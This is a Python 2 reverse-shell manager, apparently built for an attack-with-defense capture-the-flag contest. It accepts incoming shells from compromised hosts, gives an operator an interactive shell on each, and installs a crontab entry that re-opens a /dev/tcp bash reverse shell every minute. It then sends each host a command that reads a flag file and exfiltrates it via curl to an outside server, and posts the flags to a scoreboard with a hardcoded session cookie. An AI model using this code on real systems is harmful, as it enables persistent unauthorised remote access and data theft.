#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import threading
import time
import hashlib
import random
import string
import sys
import os
# import readline
import signal
import requests
import json
import pprint
import sys
import json
import requests
import time
import re
import sqlite3
from utils.log import Log


local_file_path = '/home/nealwe/Desktop/nealwe/AWD-share/AWD/AWD_001/ReserveShellManager/'
reload(sys)
sys.setdefaultencoding('utf-8')
conn = sqlite3.connect('{}shell.sqlite'.format(local_file_path))

CRAETE_TABLE_SQL = 'CREATE TABLE if not exists  csrf_flag ("id" INTEGER PRIMARY KEY  AUTOINCREMENT  NOT NULL  UNIQUE , "csrf" VARCHAR UNIQUE , "flag" VARCHAR UNIQUE );'
INSERT_DATA = """INSERT INTO csrf_flag ("csrf") VALUES ('{0}');"""
UPDATA_DATA = """UPDATE csrf_flag SET "flag" ='{1}' where "csrt" = '{0}'"""

slaves = {}
masters = {}

EXIT_FLAG = False
MAX_CONNECTION_NUMBER = 0x10

def csrf_init():
    csrf = ''.join(random.sample(string.ascii_letters + string.digits, 32))
    return csrf 

def CreateTable(sql):
    create_sql = sql
    try:
        conn.execute(create_sql)
    except Exception, e:
        print e

def InsertData(sql):
    try:
        conn.execute(sql)
        conn.commit()
    except Exception, e:
        print sql
        print e


def sub_flag(flag):
    url = "http://172.91.1.12:9090/ad/hacker/submit/submitCode"
    headers = {
        'Host':'172.91.1.12:9090',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Referer':'http://172.91.1.12:9090/arace/index',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        'Content-Length':'18',
        'Connection':'keep-alive',
        'Cookie':'JSESSIONID=8D0074ECE27699A40A18DC954E9D9C92; hibext_instdsigdipv2=1'
    }
    data = "flag={}"
    date = requests.post(url=url, headers=headers, data=data.format(flag), timeout=5).content
    print date


def submit(flag):
      fp = open("/tmp/.webshell_flags", "a+")
      # time_now = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
      time_now = int(time.time())
      fp.write("[{0}]#&&#{1}\n".format(time_now, flag))
      fp.close()

def md5(data):
    return hashlib.md5(data).hexdigest()


def recvuntil(p, target):
    data = ""
    while target not in data:
        data += p.recv(1)
    return data


def recvall(socket_fd):
    data = ""
    size = 0x100
    while True:
        try:
            r = socket_fd.recv(size)
            if not r:
                r.shutdown(socket.SHUT_RDWR)
                r.close()
            data += r
            if len(r) < size:
                break
        except:
            break
    return data


def slaver(host, port, fake):
    slaver_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    slaver_fd.connect((host, port))
    banner = "[FakeTerminal] >> "
    while True:
        if EXIT_FLAG:
            Log.warning("Slaver function exiting...")
            break
        command = recvuntil(slaver_fd, "\n")
        if fake:
            slaver_fd.send(banner)
        # Log.info("Executing : %r" % (command))
        try:
            result = os.popen(command).read()
        except:
            result = ""
        slaver_fd.send(command + result)
    Log.warning("Closing connection...")
    slaver_fd.shutdown(socket.SHUT_RDWR)
    slaver_fd.close()


def transfer(h):
    slave = slaves[h]
    socket_fd = slave.socket_fd
    buffer_size = 0x400
    interactive_stat = True
    while True:
        if EXIT_FLAG:
            Log.warning("Transfer function exiting...")
            break
        interactive_stat = slave.interactive
        buffer = socket_fd.recv(buffer_size)
        if not buffer:
            Log.error("No data, breaking...")
            break
        sys.stdout.write(buffer)
        if not interactive_stat:
            break
    if interactive_stat:
        Log.error("Unexpected EOF!")
        socket_fd.shutdown(socket.SHUT_RDWR)
        socket_fd.close()
        slave.remove_node()

def random_string(length, chars):
    return "".join([random.choice(chars) for i in range(length)])


class Slave():
    def __init__(self, socket_fd):
        self.socket_fd = socket_fd
        self.hostname, self.port = socket_fd.getpeername()
        self.node_hash = node_hash(self.hostname, self.port)
        self.interactive = False
        # self.api_info = self.location(self.hostname)
        # self.country = self.api_info['country']
        # self.isp = self.api_info['isp']
        # self.area = self.api_info['area']
        # self.region = self.api_info['region']
        # self.city = self.api_info['city']

    def location(self, host):
        try:
            response = requests.get("http://ip.taobao.com/service/getIpInfo.php?ip=%s" % (host), timeout=0.5)
            content = response.content
            return json.loads(content)["data"]
        except Exception as e:
            Log.error(str(e))
            return {"data":"error", 'country': 'Unknown_country','isp': 'Unknown_isp','area': 'Unknown_area','region': 'Unknown_region','city': 'Unknown_city',}

    def show_info(self):
        Log.info("Hash : %s" % (self.node_hash))
        Log.info("From : %s:%d" % (self.hostname, self.port))
        # Log.info("ISP : %s-%s" % (self.country, self.isp))
        # Log.info("Location : %s-%s-%s" % (self.area, self.region, self.city))

    def send_command(self, command):
        try:
            # print(command)
            self.socket_fd.send(command + "\n")
            return True
        except:
            self.remove_node()
            return False

    def send_command_log(self, command):
        log_file = "./log/%s.log" % (time.strftime("%Y-%m-%d_%H:%M:%S", time.localtime()))
        Log.info("Log file : %s" % (log_file))
        self.send_command(command)
        time.sleep(0.5)
        Log.info("Receving data from socket...")
        result = recvall(self.socket_fd)
        Log.success(result)
        with open(log_file, "a+") as f:
            f.write("[%s]\n" % ("-" * 0x20))
            f.write("From : %s:%d\n" % (self.hostname, self.port))
            f.write(u"ISP : %s-%s\n" % (self.country, self.isp))
            f.write(u"Location : %s-%s-%s\n" % (self.area, self.region, self.city))
            f.write("Command : %s\n" % (command))
            f.write("%s\n" % (result))

    def send_command_print(self, command):
        self.send_command("echo 'cmd';" + command)
        time.sleep(0.5)
        # Log.info("Receving data from socket...")
        result = recvall(self.socket_fd)
        # Log.success(result.replace("\n", "").replace("cmd", ""))
        return result.replace("\n", "").replace("cmd", "")

    def interactive_shell(self):
        self.interactive = True
        t = threading.Thread(target=transfer, args=(self.node_hash, ))
        t.start()
        try:
            while True:
                command = raw_input()
                if command == "exit":
                    self.interactive = False
                    self.socket_fd.send("\n")
                    break
                self.socket_fd.send(command + "\n")
        except:
            self.remove_node()
        self.interactive = False
        time.sleep(0.125)

    def save_crontab(self, target_file):
        command = "crontab -l > %s" % (target_file)
        self.send_command_print(command)

    def add_crontab(self, content):
        # 1. Save old crontab
        Log.info("Saving old crontab")
        chars = string.letters + string.digits
        target_file = "/tmp/%s-system.server-%s" % (random_string(0x20, chars), random_string(0x08, chars))
        self.save_crontab(target_file)
        # 3. Add a new task
        content = content + "\n"
        Log.info("Add new tasks : %s" % (content))
        command = 'echo "%s" | base64 -d >> %s' % (content.encode("base64").replace("\n", ""), target_file)
        self.send_command(command)
        # 4. Rescue crontab file
        Log.info("Rescuing crontab file...")
        command = 'crontab %s' % (target_file)
        self.send_command(command)
        # 5. Delete temp file
        Log.info("Deleting temp file...")
        command = "rm -rf %s" % (target_file)
        self.send_command(command)
        # 6. Receving buffer data
        print recvall(self.socket_fd)

    def del_crontab(self, pattern):
        # 1. Save old crontab
        Log.info("Saving old crontab")
        chars = string.letters + string.digits
        target_file = "/tmp/%s-system.server-%s" % (random_string(0x20, chars), random_string(0x08, chars))
        self.save_crontab(target_file)
        # 2. Delete old reverse shell tasks
        Log.info("Removing old tasks in crontab...")
        command = 'sed -i "/bash/d" %s' % (target_file)
        self.send_command(command)
        # 4. Rescue crontab file
        Log.info("Rescuing crontab file...")
        command = 'crontab %s' % (target_file)
        self.send_command(command)
        # 5. Delete temp file
        Log.info("Deleting temp file...")
        command = "rm -rf %s" % (target_file)
        self.send_command(command)
        # 6. Receving buffer data
        print recvall(self.socket_fd)

    def auto_connect(self, target_host, target_port):
        self.del_crontab("bash")
        content = '* * * * * bash -c "bash -i &>/dev/tcp/%s/%d 0>&1"\n' % (target_host, target_port)
        self.add_crontab(content)

    def remove_node(self):
        Log.error("Removing Node!")
        if self.node_hash in slaves.keys():
            slaves.pop(self.node_hash)


def master(host, port):
    Log.info("Master starting at %s:%d" % (host, port))
    master_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    master_fd.bind((host, port))
    master_fd.listen(MAX_CONNECTION_NUMBER)
    while(True):
        if EXIT_FLAG:
            break
        slave_fd, slave_addr = master_fd.accept()
        # Log.success("\r[+] Slave online : %s:%d" % (slave_addr[0], slave_addr[1]))
        repeat = False
        for i in slaves.keys():
            slave = slaves[i]
            if slave.hostname == slave_addr[0]:
                repeat = True
                break
        if repeat:
            # Log.warning("Detect the same host connection, reseting...")
            slave_fd.shutdown(socket.SHUT_RDWR)
            slave_fd.close()
        else:
            slave = Slave(slave_fd)
            slaves[slave.node_hash] = slave
    Log.error("Master exiting...")
    master_fd.shutdown(socket.SHUT_RDWR)
    master_fd.close()


def show_commands():
    print "Commands : "
    print "        0. [h|help|?|\\n] : show this help"
    print "        1. [q|quit|exit] : exit"

def signal_handler(ignum, frame):
    print ""
    show_commands()

def node_hash(host, port):
    return md5("%s:%d" % (host, port))

if __name__ == "__main__":

    if len(sys.argv) != 3:
        print "Usage : "
        print "\tpython master.py [HOST] [PORT]"
        exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    EXEC_LOCAL = True

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    master_thread = threading.Thread(target=master, args=(host, port,))
    slaver_thread = threading.Thread(target=slaver, args=(host, port, True,))
    master_thread.daemon = True
    slaver_thread.daemon = True
    Log.info("Starting server...")
    master_thread.start()
    Log.info("Connecting to localhost server...")
    slaver_thread.start()
    time.sleep(0.75)
    position = slaves[slaves.keys()[0]].node_hash  # master himself
    # flag_path = raw_input("[Flag Path] :").replace("\n", "")
    flag_path = "/flag/flag.txt"
    count = 0
    flag_count = 0
    csrf = ""
    try:
        CreateTable(CRAETE_TABLE_SQL)
    except:
        print "creat database fail"
    while True:
        if len(slaves.keys()) == 0:
            Log.error("No slaves left , exiting...")
            break
        if not position in slaves.keys():
            Log.error("Node is offline... Changing node...")
            position = slaves.keys()[0]
        current_slave = slaves[position]
        context_hint = "[%s:%d]" % (current_slave.hostname, current_slave.port)
        # Log.context(context_hint)
        cmd = """ifconfig;curl "http://172.91.0.101:3004/a`/bin/cat {}`/{}/" -s"""
        if len(slaves) == 1:
            time.sleep(1)
            continue
        master_ = 0
        for i in slaves.keys():
            if master_ == 0:
                master_ += 1
                continue
            try:
                csrf = csrf_init()
                InsertData(INSERT_DATA.format(csrf))
            except Exception as e:
                print e
            try:
                print "[shell_count] {}".format(len(slaves) - 1)
                slave = slaves[i]
                print cmd.format(flag_path, csrf)
                slave.send_command(cmd.format(flag_path, csrf))
                flag_count += 1
            except Exception as e:
                print "error"
            try:
                slave = slaves[i]
                if '127.0.0' not in slave.hostname :
                    slave.socket_fd.shutdown(socket.SHUT_RDWR)
                    slave.socket_fd.close()
            except:
                pass
        count += 1
        print "[round: {}]: try post flag : {}".format(count, flag_count)
        flag_count = 0
        time.sleep(5)

